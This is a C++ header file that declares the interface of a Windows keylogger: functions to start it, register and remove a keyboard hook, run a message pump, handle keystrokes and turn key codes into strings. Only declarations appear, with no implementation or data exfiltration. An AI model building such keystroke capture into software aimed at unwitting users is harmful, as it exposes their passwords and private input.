#pragma once
#include <windows.h>
#include "Keyboard.h"

void InitKeyLogger();
void RunKeyLogger();
void RegisterHook();
void UnregisterHook();
void MessagePump() noexcept;
void HandleKeyStrokes();

LRESULT KbdProc(int nCode, WPARAM wParam, LPARAM lParam) noexcept;
std::optional<std::string> KeyCodeToString(int keyCode);